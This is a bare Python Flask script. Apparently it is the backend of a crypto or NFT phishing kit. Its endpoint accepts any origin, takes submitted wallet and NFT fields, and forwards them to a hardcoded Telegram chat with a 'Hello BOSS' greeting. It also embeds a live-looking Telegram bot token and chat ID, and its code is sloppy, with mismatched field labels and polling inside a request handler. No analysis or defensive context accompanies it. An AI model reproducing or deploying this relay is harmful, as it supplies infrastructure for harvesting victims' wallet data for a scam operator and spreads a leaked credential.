from flask import Flask, request 
import telebot
from flask_cors import CORS 

server = Flask( __name__)




CORS(server)
@server.route("/send_telegram_message", methods=["POST"])
def send_telegram_message():
    data = request.get_json()
    data2 = request.get_json()
    data3 = request.get_json()
    wallet = data["wallet"]
    nfttitle = data2["nfttitle"]
    nft1title = data3["nft1title"]
    bot = telebot.TeleBot("7627115459:AAEiTCndAc5YzimdZf1f5PDROEaU6LDg0a0")
    bot.send_message("5724035137",f"Hello BOSS, Nickname:{wallet},Name:{nft1title}, country:{ nfttitle}")
    bot.polling()








server.run()





























































































